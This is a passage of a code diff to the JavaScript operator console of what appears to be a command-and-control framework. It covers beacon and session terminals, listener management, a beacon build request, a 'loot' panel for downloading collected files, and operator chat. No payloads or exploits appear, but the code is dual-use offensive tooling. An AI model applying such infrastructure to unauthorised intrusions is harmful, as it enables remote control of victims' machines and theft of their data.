+        if (sessionWs) { sessionWs.close(); sessionWs = null; }
         beaconId = null;
+
+        // Hide shell terminal, show beacon terminal
+        const shellEl = document.getElementById('shell-terminal');
+        const termEl = document.getElementById('terminal');
+        if (shellEl) shellEl.style.display = 'none';
+        if (termEl) termEl.style.display = '';
 
         if (_openTabs.size > 0) {
             const nextId = _openTabs.keys().next().value;
@@ -1597,6 +2537,9 @@ function _closeTab(id) {
 }
 
 async function openTerminal(id) {
+    const isSession = typeof id === 'string' && id.startsWith('sess_');
+    const actualId = isSession ? parseInt(id.slice(5), 10) : id;
+
     if (!_term) _initXterm('terminal');
 
     if (_openTabs.has(id)) {
@@ -1604,6 +2547,15 @@ async function openTerminal(id) {
         document.body.classList.add('panel-open');
         _saveTabs();
         return;
+    }
+
+    // If coming from a shell tab, swap visibility (keep WS alive in background)
+    const oldIsShell = typeof beaconId === 'string' && beaconId.startsWith('shell_');
+    if (oldIsShell) {
+        const shellEl = document.getElementById('shell-terminal');
+        const termEl = document.getElementById('terminal');
+        if (shellEl) shellEl.style.display = 'none';
+        if (termEl) termEl.style.display = '';
     }
 
     _saveBeaconState(beaconId);
@@ -1618,40 +2570,77 @@ async function openTerminal(id) {
 
     document.body.classList.add('panel-open');
 
-    const serverState = await _loadTerminalFromServer(id);
-    if (serverState && serverState.outputLog.length > 0) {
-        _beaconStates[id] = serverState;
-        _restoreBeaconState(id);
-        pollSince = serverState.pollSince || 0;
+    if (!isSession) {
+        const serverState = await _loadTerminalFromServer(actualId);
+        if (serverState && serverState.outputLog.length > 0) {
+            _beaconStates[id] = serverState;
+            _restoreBeaconState(id);
+            pollSince = serverState.pollSince || 0;
+        } else {
+            pollSince = Math.floor(Date.now() / 1000) - 1;
+            _promptVisible = false;
+            appendLine('Type "help" to list available commands.', 'hint');
+        }
     } else {
         pollSince = Math.floor(Date.now() / 1000) - 1;
+        if (_term) { _term.clear(); _term.write('\x1b[2J\x1b[H'); }
+        _outputLog = []; _promptVisible = false;
+        appendLine('\x1b[36mSession terminal — commands routed via TCP (real-time).\x1b[0m', 'info');
         appendLine('Type "help" to list available commands.', 'hint');
+        connectSessionWs(actualId);
     }
     _writePrompt();
     if (_term) { _term.scrollToBottom(); _term.focus(); }
 
-    _openTabs.set(id, { hostname: '?' });
+    const _bid = (typeof id === 'string' && id.startsWith('sess_')) ? parseInt(id.slice(5), 10) :
+                 (typeof id === 'string' && id.startsWith('shell_')) ? parseInt(id.slice(6), 10) : id;
+    const _cached = _beacons && _beacons[_bid];
+    _openTabs.set(id, { hostname: (_cached && _cached.hostname) || '?' });
     _fetchTabHostname(id);
     _renderTabs();
     _saveTabs();
 
-    if (pollInterval) clearInterval(pollInterval);
-    pollInterval = setInterval(pollResults, 2000);
     pollResults();
+}
+
+function _refreshOpenTabHostnames() {
+    if (!_beacons || _openTabs.size === 0) return;
+    let changed = false;
+    for (const [id, tab] of _openTabs) {
+        let actualId;
+        if (typeof id === 'string' && id.startsWith('sess_'))       actualId = parseInt(id.slice(5), 10);
+        else if (typeof id === 'string' && id.startsWith('shell_')) actualId = parseInt(id.slice(6), 10);
+        else                                                        actualId = id;
+        const b = _beacons[actualId];
+        if (b && b.hostname && tab.hostname !== b.hostname) {
+            tab.hostname = b.hostname;
+            changed = true;
+        }
+    }
+    if (changed) { _renderTabs(); _saveTabs(); }
 }
 
 async function _fetchTabHostname(id) {
     const tsUrl = getTsUrl();
     if (!tsUrl) return;
+    let actualId;
+    if (typeof id === 'string' && id.startsWith('sess_'))       actualId = parseInt(id.slice(5), 10);
+    else if (typeof id === 'string' && id.startsWith('shell_')) actualId = parseInt(id.slice(6), 10);
+    else                                                        actualId = id;
     try {
-        const resp = await fetch(tsUrl + '/api/sessions');
+        const resp = await authFetch(tsUrl + '/api/sessions');
         const beacons = await resp.json();
-        const b = beacons.find(x => x.id === id);
+        const b = beacons.find(x => x.id === actualId);
         if (!b) return;
         const tab = _openTabs.get(id);
-        if (tab) {
-            tab.hostname = b.hostname || '?';
+        if (tab && b.hostname) {
+            tab.hostname = b.hostname;
             _renderTabs();
+            _saveTabs();
+        }
+        _beaconModes[actualId] = b.mode || 'beacon';
+        if (b.mode === 'session' && _isSessionTab()) {
+            connectSessionWs(actualId);
         }
     } catch (_) {}
 }
@@ -1659,13 +2648,13 @@ async function _fetchTabHostname(id) {
 function closeTerminal() {
     _saveBeaconState(beaconId);
     document.body.classList.remove('panel-open');
-    if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
+    if (sessionWs) { sessionWs.close(); sessionWs = null; }
     beaconId = null;
     _saveTabs();
 }
 
 window.addEventListener('beforeunload', () => {
-    if (beaconId != null && _term) {
+    if (beaconId != null && _term && !(typeof beaconId === 'string' && beaconId.startsWith('shell_'))) {
         _beaconStates[beaconId] = {
             outputLog: _outputLog.slice(),
             cmdHistory: cmdHistory.slice(),
@@ -1682,7 +2671,7 @@ window.addEventListener('beforeunload', () => {
             navigator.sendBeacon(tsUrl + '/api/terminal/' + beaconId, blob);
         }
     }
-    if (document.getElementById('sessions-grid') !== null) _saveTabs();
+    if (document.getElementById('sessions-table-view') !== null) _saveTabs();
 });
 
 // ---- Build page ----
@@ -1701,7 +2690,7 @@ async function populateBuildListeners() {
     if (!tsUrl) { sel.innerHTML = '<option value="">— connect to teamserver first —</option>'; return; }
 
     try {
-        const resp = await fetch(tsUrl + '/api/listeners');
+        const resp = await authFetch(tsUrl + '/api/listeners');
         if (!resp.ok) throw new Error('HTTP ' + resp.status);
         const listeners = await resp.json();
         sel.innerHTML = '<option value="">— select a listener —</option>';
@@ -1753,7 +2742,7 @@ async function buildBeacon() {
     showBuildStatus('3, 2, 1, let\'s jam\u2026 compiling ' + filename, '');
 
     try {
-        const resp = await fetch(tsUrl + '/api/build', {
+        const resp = await authFetch(tsUrl + '/api/build', {
             method:  'POST',
             headers: { 'Content-Type': 'application/json' },
             body:    JSON.stringify({
@@ -1761,6 +2750,7 @@ async function buildBeacon() {
                 sleep_ms:    sleepMs,
                 jitter_pct:  isNaN(jitter) ? 20 : jitter,
                 format:      format,
+                session_port: 4443,
             })
         });
         if (!resp.ok) {
@@ -1802,7 +2792,7 @@ async function loadListeners() {
     }
 
     try {
-        const resp = await fetch(tsUrl + '/api/listeners');
+        const resp = await authFetch(tsUrl + '/api/listeners');
         if (!resp.ok) throw new Error('HTTP ' + resp.status);
         const listeners = await resp.json();
 
@@ -1820,6 +2810,7 @@ async function loadListeners() {
         listeners.forEach((l, i) => {
             const tr = document.createElement('tr');
             tr.style.animationDelay = (i * 0.04) + 's';
+            tr.style.cursor = 'context-menu';
 
             const schemeBadge = '<span class="listener-badge badge-' + l.scheme + '">' + l.scheme.toUpperCase() + '</span>';
             const certBadge   = l.scheme === 'https'
@@ -1827,9 +2818,6 @@ async function loadListeners() {
                     ? '<span class="listener-badge badge-autocert">self-signed</span>'
                     : '<span class="listener-badge badge-realcert">custom</span>')
                 : '<span style="color:var(--text-dim);font-family:\'Share Tech Mono\',monospace;font-size:11px;">—</span>';
-            const deleteBtn = '<button class="btn-delete-listener"' +
-                ' onclick="confirmDeleteListener(' + l.id + ',\'' + escapeHtml(l.name) + '\')"' +
-                '>delete</button>';
 
             tr.innerHTML =
                 '<td style="color:var(--text-dim);">' + l.id + '</td>' +
@@ -1837,8 +2825,8 @@ async function loadListeners() {
                 '<td>' + schemeBadge + '</td>' +
                 '<td style="font-family:\'Share Tech Mono\',monospace;">' + escapeHtml(l.host || '—') + '</td>' +
                 '<td>' + l.port + '</td>' +
-                '<td>' + certBadge + '</td>' +
-                '<td>' + deleteBtn + '</td>';
+                '<td>' + certBadge + '</td>';
+            tr.addEventListener('contextmenu', (e) => { e.preventDefault(); showListenerContextMenu(e, l); });
             tbody.appendChild(tr);
         });
     } catch (e) {
@@ -1851,6 +2839,30 @@ async function loadListeners() {
         updateConnIndicator(false);
     }
 }
+
+function showListenerContextMenu(e, listener) {
+    const menu = document.getElementById('listener-context-menu');
+    if (!menu) return;
+    const del = document.getElementById('ctx-listener-delete');
+    if (del) {
+        del.textContent = listener.is_default ? 'Default (cannot delete)' : 'Delete Listener';
+        del.style.opacity = listener.is_default ? '0.4' : '';
+        del.onclick = listener.is_default ? null : () => {
+            confirmDeleteListener(listener.id, listener.name);
+            menu.style.display = 'none';
+        };
+    }
+    menu.style.display = 'block';
+    const mx = Math.min(e.clientX, window.innerWidth - menu.offsetWidth - 8);
+    const my = Math.min(e.clientY, window.innerHeight - menu.offsetHeight - 8);
+    menu.style.left = mx + 'px';
+    menu.style.top = my + 'px';
+}
+
+document.addEventListener('click', () => {
+    const menu = document.getElementById('listener-context-menu');
+    if (menu) menu.style.display = 'none';
+});
 
 let _deleteListenerId = null;
 
@@ -1879,7 +2891,7 @@ async function deleteListenerById(id) {
     const tsUrl = getTsUrl();
     if (!tsUrl) return;
     try {
-        const resp = await fetch(tsUrl + '/api/listeners/' + id, { method: 'DELETE' });
+        const resp = await authFetch(tsUrl + '/api/listeners/' + id, { method: 'DELETE' });
         if (!resp.ok) throw new Error(await resp.text());
         loadListeners();
     } catch (e) {
@@ -1989,7 +3001,7 @@ async function submitCreateListener() {
 
     const tsUrl = getTsUrl();
     try {
-        const resp = await fetch(tsUrl + '/api/listeners', {
+        const resp = await authFetch(tsUrl + '/api/listeners', {
             method:  'POST',
             headers: { 'Content-Type': 'application/json' },
             body:    JSON.stringify(payload),
@@ -2009,37 +3021,21 @@ async function submitCreateListener() {
 
 document.addEventListener('visibilitychange', () => {
     if (document.hidden) {
-        if (_sessionsInterval) { clearInterval(_sessionsInterval); _sessionsInterval = null; }
-        if (pollInterval)      { clearInterval(pollInterval);      pollInterval = null; }
-        if (_eventLogInterval) { clearInterval(_eventLogInterval); _eventLogInterval = null; }
-        if (_lootInterval)     { clearInterval(_lootInterval);     _lootInterval = null; }
-        if (_listenersInterval){ clearInterval(_listenersInterval); _listenersInterval = null; }
+        // nothing to clear — WebSocket handles real-time updates
     } else {
-        if (document.getElementById('sessions-grid') !== null) {
-            if (!_sessionsInterval) { loadSessions(); _sessionsInterval = setInterval(loadSessions, 2000); }
-            if (!_eventLogInterval) { loadEventLog(); _eventLogInterval = setInterval(loadEventLog, 5000); }
-            if (!_lootInterval)     { loadLootPanel(); _lootInterval = setInterval(loadLootPanel, 8000); }
-        }
-        if (document.getElementById('listeners-tbody') !== null && !_listenersInterval) {
-            loadListeners();
-            _listenersInterval = setInterval(loadListeners, 8000);
-        }
-        if (beaconId !== null && !pollInterval) {
-            pollInterval = setInterval(pollResults, 2000);
+        if (!_operatorWs || _operatorWs.readyState !== WebSocket.OPEN) {
+            connectOperatorWs();
         }
     }
 });
 
 // ---- Init ----
 
-if (document.getElementById('sessions-grid') !== null) {
+if (document.getElementById('sessions-table-view') !== null) {
+    if (!checkAuth()) { /* redirecting to /login */ }
+    else {
     initSettings();
-    loadEventLog();
-    _eventLogInterval = setInterval(loadEventLog, 5000);
-    loadLootPanel();
-    _lootInterval = setInterval(loadLootPanel, 8000);
-    loadSessions();
-    _sessionsInterval = setInterval(loadSessions, 2000);
+    connectOperatorWs();
 
     ['tsIp', 'tsPort'].forEach(id => {
         const el = document.getElementById(id);
@@ -2067,15 +3063,16 @@ if (document.getElementById('sessions-grid') !== null) {
             _writePrompt();
             if (_term) { _term.scrollToBottom(); _term.focus(); }
         });
-        if (pollInterval) clearInterval(pollInterval);
-        pollInterval = setInterval(pollResults, 2000);
-        pollResults();
+    }
     }
 }
 
 if (document.getElementById('build-btn') !== null) {
-    initSettings();
-    populateBuildListeners();
+    if (!checkAuth()) { /* redirecting to /login */ }
+    else {
+        initSettings();
+        populateBuildListeners();
+    }
 }
 
 // ---- Log panel tab switching (events / loot) ----
@@ -2086,10 +3083,12 @@ function switchLogTab(tab) {
     _activeLogTab = tab;
     const evBody   = document.getElementById('event-log-body');
     const lootBody = document.getElementById('loot-log-body');
+    const chatBody = document.getElementById('chat-log-body');
     if (!evBody || !lootBody) return;
 
     evBody.style.display   = tab === 'events' ? '' : 'none';
     lootBody.style.display = tab === 'loot'   ? '' : 'none';
+    if (chatBody) chatBody.style.display = tab === 'chat' ? '' : 'none';
 
     document.querySelectorAll('.event-log-tab').forEach(el => {
         el.classList.toggle('active', el.dataset.tab === tab);
@@ -2097,6 +3096,14 @@ function switchLogTab(tab) {
 
     const exportBtn = document.getElementById('export-log-btn');
     if (exportBtn) exportBtn.style.display = tab === 'events' ? '' : 'none';
+
+    if (tab === 'chat') {
+        clearChatUnread();
+        const input = document.getElementById('chat-input');
+        if (input) input.focus();
+        const msgs = document.getElementById('chat-messages');
+        if (msgs) msgs.scrollTop = msgs.scrollHeight;
+    }
 }
 
 // ---- Loot panel ----
@@ -2117,7 +3124,7 @@ async function loadLootPanel() {
     if (!tsUrl) return;
 
     try {
-        const resp = await fetch(tsUrl + '/api/loot');
+        const resp = await authFetch(tsUrl + '/api/loot');
         if (!resp.ok) return;
         const files = await resp.json();
 
@@ -2164,7 +3171,7 @@ async function deleteLootEntry(label, btn) {
     const tsUrl = getTsUrl();
     if (!tsUrl) return;
     try {
-        await fetch(tsUrl + '/api/files/' + label, { method: 'DELETE' });
+        await authFetch(tsUrl + '/api/files/' + label, { method: 'DELETE' });
         if (btn) {
             const row = btn.closest('.loot-entry');
             if (row) row.remove();
@@ -2177,7 +3184,7 @@ async function downloadLootEntry(label, filename) {
     const tsUrl = getTsUrl();
     if (!tsUrl) return;
     try {
-        const resp = await fetch(tsUrl + '/api/files/' + label);
+        const resp = await authFetch(tsUrl + '/api/files/' + label);
         if (!resp.ok) return;
         const blob = await resp.blob();
         const url = URL.createObjectURL(blob);
@@ -2192,36 +3199,115 @@ async function downloadLootEntry(label, filename) {
 }
 
 if (document.getElementById('listeners-tbody') !== null) {
-    initSettings();
-    loadListeners();
-    _listenersInterval = setInterval(loadListeners, 8000);
-    ['tsIp', 'tsPort'].forEach(id => {
-        const el = document.getElementById(id);
-        if (el) el.addEventListener('keydown', e => { if (e.key === 'Enter') saveSettings(); });
+    if (!checkAuth()) { /* redirecting to /login */ }
+    else {
+        initSettings();
+        loadListeners();
+        ['tsIp', 'tsPort'].forEach(id => {
+            const el = document.getElementById(id);
+            if (el) el.addEventListener('keydown', e => { if (e.key === 'Enter') saveSettings(); });
+        });
+    }
+}
+
+window.addEventListener('resize', () => { if (_currentView === 'map') loadSessions(); });
+
+// ---- Operator chat ----
+
+function _handleChatMsg(action, data) {
+    if (action === 'sync') {
+        renderChatHistory(data || []);
+    } else if (action === 'add') {
+        appendChatMessage(data);
+        const currentTab = document.querySelector('.event-log-tab.active')?.dataset.tab;
+        if (currentTab !== 'chat') {
+            showChatUnread();
+        }
+    }
+}
+
+function renderChatHistory(msgs) {
+    const box = document.getElementById('chat-messages');
+    if (!box) return;
+    box.innerHTML = '';
+    msgs.forEach(appendChatMessage);
+}
+
+function appendChatMessage(m) {
+    const box = document.getElementById('chat-messages');
+    if (!box) return;
+
+    const row = document.createElement('div');
+    row.className = 'chat-msg';
+
+    const ts = document.createElement('span');
+    ts.className = 'chat-ts';
+    ts.textContent = formatChatTimestamp(m.timestamp);
+
+    const op = document.createElement('span');
+    op.className = 'chat-op';
+    op.textContent = (m.operator || '?');
+    op.style.color = operatorColor(m.operator || '?');
+
+    const msg = document.createElement('span');
+    msg.className = 'chat-text';
+    msg.textContent = m.message || '';
+
+    row.appendChild(ts);
+    row.appendChild(op);
+    row.appendChild(msg);
+    box.appendChild(row);
+
+    box.scrollTop = box.scrollHeight;
+}
+
+function formatChatTimestamp(ts) {
+    const d = new Date(ts);
+    if (isNaN(d.getTime())) {
+        return '[--:--:--]';
+    }
+    const hh = String(d.getHours()).padStart(2, '0');
+    const mm = String(d.getMinutes()).padStart(2, '0');
+    const ss = String(d.getSeconds()).padStart(2, '0');
+    return `[${hh}:${mm}:${ss}]`;
+}
+
+function operatorColor(name) {
+    let h = 5381;
+    for (let i = 0; i < name.length; i++) {
+        h = ((h << 5) + h + name.charCodeAt(i)) | 0;
+    }
+    const hue = Math.abs(h) % 360;
+    return `hsl(${hue}, 70%, 65%)`;
+}
+
+function showChatUnread() {
+    const dot = document.getElementById('chatUnreadDot');
+    if (dot) dot.classList.add('has-unread');
+}
+
+function clearChatUnread() {
+    const dot = document.getElementById('chatUnreadDot');
+    if (dot) dot.classList.remove('has-unread');
+}
+
+function initChatForm() {
+    const form = document.getElementById('chat-form');
+    const input = document.getElementById('chat-input');
+    if (!form || !input) return;
+
+    form.addEventListener('submit', (e) => {
+        e.preventDefault();
+        const text = input.value.trim();
+        if (!text) return;
+        if (!_operatorWs || _operatorWs.readyState !== WebSocket.OPEN) return;
+        _operatorWs.send(JSON.stringify({
+            topic: 'chat',
+            action: 'send',
+            data: { message: text },
+        }));
+        input.value = '';
     });
 }
 
-// interact.html standalone — beacon ID from URL + session timer
-if (document.body.dataset.page === 'interact') {
-    _initXterm('terminal');
-    beaconId     = getBeaconId();
-    loadBeaconInfo(beaconId);
-    pollSince    = Math.floor(Date.now() / 1000) - 1;
-    pollInterval = setInterval(pollResults, 2000);
-    appendLine('Type "help" to list available commands.', 'hint');
-    _writePrompt();
-    if (_term) _term.focus();
-
-    // Session elapsed timer
-    const _sessionStart = Date.now();
-    setInterval(() => {
-        const el = document.getElementById('session-elapsed');
-        if (!el) return;
-        const s   = Math.floor((Date.now() - _sessionStart) / 1000);
-        const h   = String(Math.floor(s / 3600)).padStart(2, '0');
-        const m   = String(Math.floor((s % 3600) / 60)).padStart(2, '0');
-        const sec = String(s % 60).padStart(2, '0');
-        el.textContent = h + ':' + m + ':' + sec;
-    }, 1000);
-}
-window.addEventListener('resize', () => { if (_currentView === 'map') loadSessions(); });
+document.addEventListener('DOMContentLoaded', initChatForm);
